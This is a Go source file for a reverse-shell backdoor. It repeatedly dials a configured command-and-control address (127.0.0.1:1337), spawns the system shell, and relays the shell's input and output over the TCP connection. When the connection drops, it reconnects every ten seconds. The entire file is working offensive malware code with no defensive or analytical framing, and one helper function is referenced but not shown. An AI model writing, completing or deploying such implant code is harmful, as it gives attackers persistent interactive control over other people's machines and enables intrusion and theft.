package main

import (
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

const (
	readBufSize    = 128
	beaconInterval = 10 * time.Second
	connTimeout    = 15 * time.Second
)

var (
	c2Servers = [...]string{"127.0.0.1:1337"}
)

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}

// ReverseShell - Execute a reverse shell to host
func reverseShell(command string, send chan<- []byte, recv <-chan []byte) {
	var cmd *exec.Cmd
	cmd = exec.Command(command)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		for {
			select {
			case incoming := <-recv:
				stdin.Write(incoming)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, readBufSize)
			stderr.Read(buf)
			send <- buf
		}
	}()

	go func() {
		for {
			buf := make([]byte, readBufSize)
			stdout.Read(buf)
			send <- buf
		}
	}()

	cmd.Run()
}

func findTCPConnection() (net.Conn, error) {
	for _, c2server := range c2Servers {
		conn, err := net.Dial("tcp", c2server)
		if err == nil {
			return conn, nil
		}
	}
	return nil, errors.New("no connection")
}

func interactive(conn net.Conn, send chan []byte, recv chan []byte) {

	defer conn.Close()

	go func() {
		for {
			data := make([]byte, readBufSize)
			conn.SetReadDeadline(time.Now().Add(connTimeout))
			_, err := conn.Read(data)
			if err != nil {
				fmt.Println("read error")
				recv <- []byte("exit\n")
				return
			}
			recv <- data
		}
	}()

	go func() {
		for {
			select {
			case outgoing := <-send:
				conn.Write(outgoing)
			case <-time.After(connTimeout):
				return
			}
		}
	}()

	reverseShell(GetSystemShellPath(), send, recv)
}

func main() {

	send := make(chan []byte)
	recv := make(chan []byte)

	for {
		conn, err := findTCPConnection()

		if err == nil {

			fmt.Println("connected")
			interactive(conn, send, recv)

		}

		fmt.Println("reconnecting ...")
		time.Sleep(beaconInterval)
	}

}
